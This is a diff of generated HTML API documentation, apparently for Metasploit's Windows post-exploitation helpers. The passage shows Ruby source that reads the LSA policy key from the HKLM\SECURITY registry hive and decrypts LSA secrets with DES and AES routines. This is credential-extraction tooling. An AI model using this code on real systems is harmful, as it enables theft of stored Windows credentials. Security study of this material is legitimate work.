+    <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Vista or above system</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='ivar'>@lsa_vista_style</span> <span class='op'>=</span> <span class='kw'>true</span>
+
+    <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Trying &#39;V72&#39; style...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Getting PolEKList...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_pol'>pol</span> <span class='op'>=</span> <span class='id identifier rubyid_registry_getvaldata'>registry_getvaldata</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HKLM\\SECURITY\\Policy\\PolEKList</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+    <span class='comment'># If that didn&#39;t work, then we&#39;re out of luck
+</span>    <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='id identifier rubyid_pol'>pol</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+    <span class='id identifier rubyid_lsa_key'>lsa_key</span> <span class='op'>=</span> <span class='id identifier rubyid_decrypt_lsa_data'>decrypt_lsa_data</span><span class='lparen'>(</span><span class='id identifier rubyid_pol'>pol</span><span class='comma'>,</span> <span class='id identifier rubyid_bootkey'>bootkey</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_lsa_key'>lsa_key</span> <span class='op'>=</span> <span class='id identifier rubyid_lsa_key'>lsa_key</span><span class='lbracket'>[</span><span class='int'>68</span><span class='comma'>,</span><span class='int'>32</span><span class='rbracket'>]</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_vprint_good'>vprint_good</span><span class='lparen'>(</span><span class='id identifier rubyid_lsa_key'>lsa_key</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>H*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_lsa_key'>lsa_key</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="convert_des_56_to_64-instance_method">
+  
+    - (<tt>Object</tt>) <strong>convert_des_56_to_64</strong>(kstr) 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Converts DES 56 to DES 64</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 210</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_convert_des_56_to_64'>convert_des_56_to_64</span><span class='lparen'>(</span><span class='id identifier rubyid_kstr'>kstr</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_des_odd_parity'>des_odd_parity</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+    <span class='int'>1</span><span class='comma'>,</span> <span class='int'>1</span><span class='comma'>,</span> <span class='int'>2</span><span class='comma'>,</span> <span class='int'>2</span><span class='comma'>,</span> <span class='int'>4</span><span class='comma'>,</span> <span class='int'>4</span><span class='comma'>,</span> <span class='int'>7</span><span class='comma'>,</span> <span class='int'>7</span><span class='comma'>,</span> <span class='int'>8</span><span class='comma'>,</span> <span class='int'>8</span><span class='comma'>,</span> <span class='int'>11</span><span class='comma'>,</span> <span class='int'>11</span><span class='comma'>,</span> <span class='int'>13</span><span class='comma'>,</span> <span class='int'>13</span><span class='comma'>,</span> <span class='int'>14</span><span class='comma'>,</span> <span class='int'>14</span><span class='comma'>,</span>
+    <span class='int'>16</span><span class='comma'>,</span> <span class='int'>16</span><span class='comma'>,</span> <span class='int'>19</span><span class='comma'>,</span> <span class='int'>19</span><span class='comma'>,</span> <span class='int'>21</span><span class='comma'>,</span> <span class='int'>21</span><span class='comma'>,</span> <span class='int'>22</span><span class='comma'>,</span> <span class='int'>22</span><span class='comma'>,</span> <span class='int'>25</span><span class='comma'>,</span> <span class='int'>25</span><span class='comma'>,</span> <span class='int'>26</span><span class='comma'>,</span> <span class='int'>26</span><span class='comma'>,</span> <span class='int'>28</span><span class='comma'>,</span> <span class='int'>28</span><span class='comma'>,</span> <span class='int'>31</span><span class='comma'>,</span> <span class='int'>31</span><span class='comma'>,</span>
+    <span class='int'>32</span><span class='comma'>,</span> <span class='int'>32</span><span class='comma'>,</span> <span class='int'>35</span><span class='comma'>,</span> <span class='int'>35</span><span class='comma'>,</span> <span class='int'>37</span><span class='comma'>,</span> <span class='int'>37</span><span class='comma'>,</span> <span class='int'>38</span><span class='comma'>,</span> <span class='int'>38</span><span class='comma'>,</span> <span class='int'>41</span><span class='comma'>,</span> <span class='int'>41</span><span class='comma'>,</span> <span class='int'>42</span><span class='comma'>,</span> <span class='int'>42</span><span class='comma'>,</span> <span class='int'>44</span><span class='comma'>,</span> <span class='int'>44</span><span class='comma'>,</span> <span class='int'>47</span><span class='comma'>,</span> <span class='int'>47</span><span class='comma'>,</span>
+    <span class='int'>49</span><span class='comma'>,</span> <span class='int'>49</span><span class='comma'>,</span> <span class='int'>50</span><span class='comma'>,</span> <span class='int'>50</span><span class='comma'>,</span> <span class='int'>52</span><span class='comma'>,</span> <span class='int'>52</span><span class='comma'>,</span> <span class='int'>55</span><span class='comma'>,</span> <span class='int'>55</span><span class='comma'>,</span> <span class='int'>56</span><span class='comma'>,</span> <span class='int'>56</span><span class='comma'>,</span> <span class='int'>59</span><span class='comma'>,</span> <span class='int'>59</span><span class='comma'>,</span> <span class='int'>61</span><span class='comma'>,</span> <span class='int'>61</span><span class='comma'>,</span> <span class='int'>62</span><span class='comma'>,</span> <span class='int'>62</span><span class='comma'>,</span>
+    <span class='int'>64</span><span class='comma'>,</span> <span class='int'>64</span><span class='comma'>,</span> <span class='int'>67</span><span class='comma'>,</span> <span class='int'>67</span><span class='comma'>,</span> <span class='int'>69</span><span class='comma'>,</span> <span class='int'>69</span><span class='comma'>,</span> <span class='int'>70</span><span class='comma'>,</span> <span class='int'>70</span><span class='comma'>,</span> <span class='int'>73</span><span class='comma'>,</span> <span class='int'>73</span><span class='comma'>,</span> <span class='int'>74</span><span class='comma'>,</span> <span class='int'>74</span><span class='comma'>,</span> <span class='int'>76</span><span class='comma'>,</span> <span class='int'>76</span><span class='comma'>,</span> <span class='int'>79</span><span class='comma'>,</span> <span class='int'>79</span><span class='comma'>,</span>
+    <span class='int'>81</span><span class='comma'>,</span> <span class='int'>81</span><span class='comma'>,</span> <span class='int'>82</span><span class='comma'>,</span> <span class='int'>82</span><span class='comma'>,</span> <span class='int'>84</span><span class='comma'>,</span> <span class='int'>84</span><span class='comma'>,</span> <span class='int'>87</span><span class='comma'>,</span> <span class='int'>87</span><span class='comma'>,</span> <span class='int'>88</span><span class='comma'>,</span> <span class='int'>88</span><span class='comma'>,</span> <span class='int'>91</span><span class='comma'>,</span> <span class='int'>91</span><span class='comma'>,</span> <span class='int'>93</span><span class='comma'>,</span> <span class='int'>93</span><span class='comma'>,</span> <span class='int'>94</span><span class='comma'>,</span> <span class='int'>94</span><span class='comma'>,</span>
+    <span class='int'>97</span><span class='comma'>,</span> <span class='int'>97</span><span class='comma'>,</span> <span class='int'>98</span><span class='comma'>,</span> <span class='int'>98</span><span class='comma'>,</span><span class='int'>100</span><span class='comma'>,</span><span class='int'>100</span><span class='comma'>,</span><span class='int'>103</span><span class='comma'>,</span><span class='int'>103</span><span class='comma'>,</span><span class='int'>104</span><span class='comma'>,</span><span class='int'>104</span><span class='comma'>,</span><span class='int'>107</span><span class='comma'>,</span><span class='int'>107</span><span class='comma'>,</span><span class='int'>109</span><span class='comma'>,</span><span class='int'>109</span><span class='comma'>,</span><span class='int'>110</span><span class='comma'>,</span><span class='int'>110</span><span class='comma'>,</span>
+    <span class='int'>112</span><span class='comma'>,</span><span class='int'>112</span><span class='comma'>,</span><span class='int'>115</span><span class='comma'>,</span><span class='int'>115</span><span class='comma'>,</span><span class='int'>117</span><span class='comma'>,</span><span class='int'>117</span><span class='comma'>,</span><span class='int'>118</span><span class='comma'>,</span><span class='int'>118</span><span class='comma'>,</span><span class='int'>121</span><span class='comma'>,</span><span class='int'>121</span><span class='comma'>,</span><span class='int'>122</span><span class='comma'>,</span><span class='int'>122</span><span class='comma'>,</span><span class='int'>124</span><span class='comma'>,</span><span class='int'>124</span><span class='comma'>,</span><span class='int'>127</span><span class='comma'>,</span><span class='int'>127</span><span class='comma'>,</span>
+    <span class='int'>128</span><span class='comma'>,</span><span class='int'>128</span><span class='comma'>,</span><span class='int'>131</span><span class='comma'>,</span><span class='int'>131</span><span class='comma'>,</span><span class='int'>133</span><span class='comma'>,</span><span class='int'>133</span><span class='comma'>,</span><span class='int'>134</span><span class='comma'>,</span><span class='int'>134</span><span class='comma'>,</span><span class='int'>137</span><span class='comma'>,</span><span class='int'>137</span><span class='comma'>,</span><span class='int'>138</span><span class='comma'>,</span><span class='int'>138</span><span class='comma'>,</span><span class='int'>140</span><span class='comma'>,</span><span class='int'>140</span><span class='comma'>,</span><span class='int'>143</span><span class='comma'>,</span><span class='int'>143</span><span class='comma'>,</span>
+    <span class='int'>145</span><span class='comma'>,</span><span class='int'>145</span><span class='comma'>,</span><span class='int'>146</span><span class='comma'>,</span><span class='int'>146</span><span class='comma'>,</span><span class='int'>148</span><span class='comma'>,</span><span class='int'>148</span><span class='comma'>,</span><span class='int'>151</span><span class='comma'>,</span><span class='int'>151</span><span class='comma'>,</span><span class='int'>152</span><span class='comma'>,</span><span class='int'>152</span><span class='comma'>,</span><span class='int'>155</span><span class='comma'>,</span><span class='int'>155</span><span class='comma'>,</span><span class='int'>157</span><span class='comma'>,</span><span class='int'>157</span><span class='comma'>,</span><span class='int'>158</span><span class='comma'>,</span><span class='int'>158</span><span class='comma'>,</span>
+    <span class='int'>161</span><span class='comma'>,</span><span class='int'>161</span><span class='comma'>,</span><span class='int'>162</span><span class='comma'>,</span><span class='int'>162</span><span class='comma'>,</span><span class='int'>164</span><span class='comma'>,</span><span class='int'>164</span><span class='comma'>,</span><span class='int'>167</span><span class='comma'>,</span><span class='int'>167</span><span class='comma'>,</span><span class='int'>168</span><span class='comma'>,</span><span class='int'>168</span><span class='comma'>,</span><span class='int'>171</span><span class='comma'>,</span><span class='int'>171</span><span class='comma'>,</span><span class='int'>173</span><span class='comma'>,</span><span class='int'>173</span><span class='comma'>,</span><span class='int'>174</span><span class='comma'>,</span><span class='int'>174</span><span class='comma'>,</span>
+    <span class='int'>176</span><span class='comma'>,</span><span class='int'>176</span><span class='comma'>,</span><span class='int'>179</span><span class='comma'>,</span><span class='int'>179</span><span class='comma'>,</span><span class='int'>181</span><span class='comma'>,</span><span class='int'>181</span><span class='comma'>,</span><span class='int'>182</span><span class='comma'>,</span><span class='int'>182</span><span class='comma'>,</span><span class='int'>185</span><span class='comma'>,</span><span class='int'>185</span><span class='comma'>,</span><span class='int'>186</span><span class='comma'>,</span><span class='int'>186</span><span class='comma'>,</span><span class='int'>188</span><span class='comma'>,</span><span class='int'>188</span><span class='comma'>,</span><span class='int'>191</span><span class='comma'>,</span><span class='int'>191</span><span class='comma'>,</span>
+    <span class='int'>193</span><span class='comma'>,</span><span class='int'>193</span><span class='comma'>,</span><span class='int'>194</span><span class='comma'>,</span><span class='int'>194</span><span class='comma'>,</span><span class='int'>196</span><span class='comma'>,</span><span class='int'>196</span><span class='comma'>,</span><span class='int'>199</span><span class='comma'>,</span><span class='int'>199</span><span class='comma'>,</span><span class='int'>200</span><span class='comma'>,</span><span class='int'>200</span><span class='comma'>,</span><span class='int'>203</span><span class='comma'>,</span><span class='int'>203</span><span class='comma'>,</span><span class='int'>205</span><span class='comma'>,</span><span class='int'>205</span><span class='comma'>,</span><span class='int'>206</span><span class='comma'>,</span><span class='int'>206</span><span class='comma'>,</span>
+    <span class='int'>208</span><span class='comma'>,</span><span class='int'>208</span><span class='comma'>,</span><span class='int'>211</span><span class='comma'>,</span><span class='int'>211</span><span class='comma'>,</span><span class='int'>213</span><span class='comma'>,</span><span class='int'>213</span><span class='comma'>,</span><span class='int'>214</span><span class='comma'>,</span><span class='int'>214</span><span class='comma'>,</span><span class='int'>217</span><span class='comma'>,</span><span class='int'>217</span><span class='comma'>,</span><span class='int'>218</span><span class='comma'>,</span><span class='int'>218</span><span class='comma'>,</span><span class='int'>220</span><span class='comma'>,</span><span class='int'>220</span><span class='comma'>,</span><span class='int'>223</span><span class='comma'>,</span><span class='int'>223</span><span class='comma'>,</span>
+    <span class='int'>224</span><span class='comma'>,</span><span class='int'>224</span><span class='comma'>,</span><span class='int'>227</span><span class='comma'>,</span><span class='int'>227</span><span class='comma'>,</span><span class='int'>229</span><span class='comma'>,</span><span class='int'>229</span><span class='comma'>,</span><span class='int'>230</span><span class='comma'>,</span><span class='int'>230</span><span class='comma'>,</span><span class='int'>233</span><span class='comma'>,</span><span class='int'>233</span><span class='comma'>,</span><span class='int'>234</span><span class='comma'>,</span><span class='int'>234</span><span class='comma'>,</span><span class='int'>236</span><span class='comma'>,</span><span class='int'>236</span><span class='comma'>,</span><span class='int'>239</span><span class='comma'>,</span><span class='int'>239</span><span class='comma'>,</span>
+    <span class='int'>241</span><span class='comma'>,</span><span class='int'>241</span><span class='comma'>,</span><span class='int'>242</span><span class='comma'>,</span><span class='int'>242</span><span class='comma'>,</span><span class='int'>244</span><span class='comma'>,</span><span class='int'>244</span><span class='comma'>,</span><span class='int'>247</span><span class='comma'>,</span><span class='int'>247</span><span class='comma'>,</span><span class='int'>248</span><span class='comma'>,</span><span class='int'>248</span><span class='comma'>,</span><span class='int'>251</span><span class='comma'>,</span><span class='int'>251</span><span class='comma'>,</span><span class='int'>253</span><span class='comma'>,</span><span class='int'>253</span><span class='comma'>,</span><span class='int'>254</span><span class='comma'>,</span><span class='int'>254</span>
+  <span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_str'>str</span> <span class='op'>=</span> <span class='id identifier rubyid_kstr'>kstr</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>&gt;&gt;</span> <span class='int'>1</span>
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>&amp;</span> <span class='int'>0x01</span><span class='rparen'>)</span> <span class='op'>&lt;&lt;</span> <span class='int'>6</span><span class='rparen'>)</span> <span class='op'>|</span> <span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>&gt;&gt;</span> <span class='int'>2</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>&amp;</span> <span class='int'>0x03</span><span class='rparen'>)</span> <span class='op'>&lt;&lt;</span> <span class='int'>5</span><span class='rparen'>)</span> <span class='op'>|</span> <span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>&gt;&gt;</span> <span class='int'>3</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>3</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>&amp;</span> <span class='int'>0x07</span><span class='rparen'>)</span> <span class='op'>&lt;&lt;</span> <span class='int'>4</span><span class='rparen'>)</span> <span class='op'>|</span> <span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>3</span><span class='rbracket'>]</span> <span class='op'>&gt;&gt;</span> <span class='int'>4</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>4</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>3</span><span class='rbracket'>]</span> <span class='op'>&amp;</span> <span class='int'>0x0F</span><span class='rparen'>)</span> <span class='op'>&lt;&lt;</span> <span class='int'>3</span><span class='rparen'>)</span> <span class='op'>|</span> <span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>4</span><span class='rbracket'>]</span> <span class='op'>&gt;&gt;</span> <span class='int'>5</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>5</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>4</span><span class='rbracket'>]</span> <span class='op'>&amp;</span> <span class='int'>0x1F</span><span class='rparen'>)</span> <span class='op'>&lt;&lt;</span> <span class='int'>2</span><span class='rparen'>)</span> <span class='op'>|</span> <span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>5</span><span class='rbracket'>]</span> <span class='op'>&gt;&gt;</span> <span class='int'>6</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>6</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>5</span><span class='rbracket'>]</span> <span class='op'>&amp;</span> <span class='int'>0x3F</span><span class='rparen'>)</span> <span class='op'>&lt;&lt;</span> <span class='int'>1</span><span class='rparen'>)</span> <span class='op'>|</span> <span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>6</span><span class='rbracket'>]</span> <span class='op'>&gt;&gt;</span> <span class='int'>7</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='int'>7</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_str'>str</span><span class='lbracket'>[</span><span class='int'>6</span><span class='rbracket'>]</span> <span class='op'>&amp;</span> <span class='int'>0x7F</span>
+
+  <span class='int'>0</span><span class='period'>.</span><span class='id identifier rubyid_upto'>upto</span><span class='lparen'>(</span><span class='int'>7</span><span class='rparen'>)</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_i'>i</span><span class='op'>|</span>
+    <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span> <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>1</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_des_odd_parity'>des_odd_parity</span><span class='lbracket'>[</span><span class='id identifier rubyid_key'>key</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='rbracket'>]</span><span class='rbracket'>]</span>
+  <span class='kw'>end</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_key'>key</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="decrypt_lsa_data-instance_method">
+  
+    - (<tt>String</tt>) <strong>decrypt_lsa_data</strong>(policy_secret, lsa_key) 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Decrypts LSA encrypted data</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>policy_secret</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>The encrypted data stored in the registry.</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>lsa_key</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>The key as returned by <span class='object_link'><a href="#capture_lsa_key-instance_method" title="Msf::Post::Windows::Priv#capture_lsa_key (method)">#capture_lsa_key</a></span></p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>The decrypted data</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 308</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_decrypt_lsa_data'>decrypt_lsa_data</span><span class='lparen'>(</span><span class='id identifier rubyid_policy_secret'>policy_secret</span><span class='comma'>,</span> <span class='id identifier rubyid_lsa_key'>lsa_key</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_sha256x'>sha256x</span> <span class='op'>=</span> <span class='const'>Digest</span><span class='op'>::</span><span class='const'>SHA256</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_sha256x'>sha256x</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_lsa_key'>lsa_key</span>
+  <span class='int'>1000</span><span class='period'>.</span><span class='id identifier rubyid_times'>times</span> <span class='kw'>do</span>
+    <span class='id identifier rubyid_sha256x'>sha256x</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_policy_secret'>policy_secret</span><span class='lbracket'>[</span><span class='int'>28</span><span class='comma'>,</span><span class='int'>32</span><span class='rbracket'>]</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_aes'>aes</span> <span class='op'>=</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>Cipher</span><span class='op'>::</span><span class='const'>Cipher</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>aes-256-cbc</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_aes'>aes</span><span class='period'>.</span><span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_sha256x'>sha256x</span><span class='period'>.</span><span class='id identifier rubyid_digest'>digest</span>
+
+  <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>digest </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_sha256x'>sha256x</span><span class='period'>.</span><span class='id identifier rubyid_digest'>digest</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>H*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_decrypted_data'>decrypted_data</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='lparen'>(</span><span class='int'>60</span><span class='op'>...</span><span class='id identifier rubyid_policy_secret'>policy_secret</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_step'>step</span><span class='lparen'>(</span><span class='int'>16</span><span class='rparen'>)</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_i'>i</span><span class='op'>|</span>
+    <span class='id identifier rubyid_aes'>aes</span><span class='period'>.</span><span class='id identifier rubyid_decrypt'>decrypt</span>
+    <span class='id identifier rubyid_aes'>aes</span><span class='period'>.</span><span class='id identifier rubyid_padding'>padding</span> <span class='op'>=</span> <span class='int'>0</span>
+    <span class='id identifier rubyid_decrypted_data'>decrypted_data</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_aes'>aes</span><span class='period'>.</span><span class='id identifier rubyid_update'>update</span><span class='lparen'>(</span><span class='id identifier rubyid_policy_secret'>policy_secret</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='comma'>,</span><span class='int'>16</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_decrypted_data'>decrypted_data</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="decrypt_secret_data-instance_method">
+  
+    - (<tt>String</tt>) <strong>decrypt_secret_data</strong>(secret, key) 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Decrypts “Secret” encrypted data</p>
+
+<p>Ruby implementation of SystemFunction005. The original python code has been
+taken from Credump</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>secret</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>key</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>The decrypted data</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356
+357
+358
+359
+360
+361
+362
+363
+364
+365</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 340</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_decrypt_secret_data'>decrypt_secret_data</span><span class='lparen'>(</span><span class='id identifier rubyid_secret'>secret</span><span class='comma'>,</span> <span class='id identifier rubyid_key'>key</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_j'>j</span> <span class='op'>=</span> <span class='int'>0</span>
+  <span class='id identifier rubyid_decrypted_data'>decrypted_data</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='kw'>for</span> <span class='id identifier rubyid_i'>i</span> <span class='kw'>in</span> <span class='lparen'>(</span><span class='int'>0</span><span class='op'>...</span><span class='id identifier rubyid_secret'>secret</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_step'>step</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span>
